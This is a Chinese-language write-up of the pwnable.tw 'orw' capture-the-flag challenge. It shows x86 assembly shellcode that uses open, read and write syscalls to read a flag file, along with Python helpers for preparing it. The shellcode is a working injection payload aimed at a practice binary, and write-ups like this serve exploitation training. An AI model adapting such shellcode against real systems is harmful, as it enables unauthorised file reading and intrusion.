# pwnable.tw 0x1 orw writeup

> 地址：[https://pwnable.tw/challenge/#2](https://pwnable.tw/challenge/#2)

<!--more-->

## 分析

扔到 Linux 虚拟机里执行一下，提示：`Give my your shellcode:`（应该是 "Give me your shellcode"），结合题目提示：

```
Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.
```

所以解题思路应该是用编写 shellcode，利用 `open`、`read`、`write` 这三个 syscall 读取 `/home/orw/flag` 中的内容。
看反汇编内容也印证了这一猜想：在获取用户输入之后，直接把输入当作指令执行了
![-w1097](https://i.loli.net/2019/02/13/5c6413f403283.jpg)


## PWN

下面开始编写 shellcode。先从 C 语言的角度考虑如何实现，伪代码如下：

```c
int fd = open("/home/orw/flag", 0, 0); // 打开文件
read(fd, buffer, count);  // 读取内容
write(1, buffer, count);  // 写到 stdout
```

所以 参考 [Linux System Call Table](https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html) 整理成汇编代码：

```asm
; open
xor ecx, ecx     ; ecx = 0
xor edx, edx     ; edx = 0
push ecx         ; 字符串终止符
push 0x67616c66  ; "flag"
push 0x2f2f7772  ; "rw//"
push 0x6f2f2f65  ; "e//o"
push 0x6d6f682f  ; "/hom"
mov ebx, esp     ; ebx = esp, 文件路径
mov eax, 0x5     ; syscall number 5, sys_open
int 0x80         ; call

; read
mov ebx, eax  ; fd
mov ecx, esp  ; buffer
mov edx, 0x30 ; size
mov eax, 0x3  ; read
int 0x80      ; call

; write
mov ebx, 0x1  ; stdout
mov eax, 0x4  ; write
int 0x80      ; call
```

##  附录1
鉴于 `pwntools` 中 `asm()` 方法不支持注释，而我又比较喜欢写注释，所以写了一个简单的 python 函数来处理汇编代码中的注释：

```python
import re

re_pure_asm = re.compile('^(.+?)(?=;)')

def pure_asm(string):
    lines = []
    for line in string.splitlines():
        result = re_pure_asm.findall(line)
        if len(result) > 0:
            lines.append(result[0].strip())
    return '\n'.join(lines)
```

## 附录2
为了比较方便的把 `flag` 这样的字符串转换成 `0x67616c66` 这样的 16进制小端数值，也写了一个简单的 python 方法：

```python
def convert_str_to_hex(string):
    parts = []
    for ch in string:
        parts.insert(0, format(ord(ch), 'x'))
    return '0x' + ''.join(parts)
```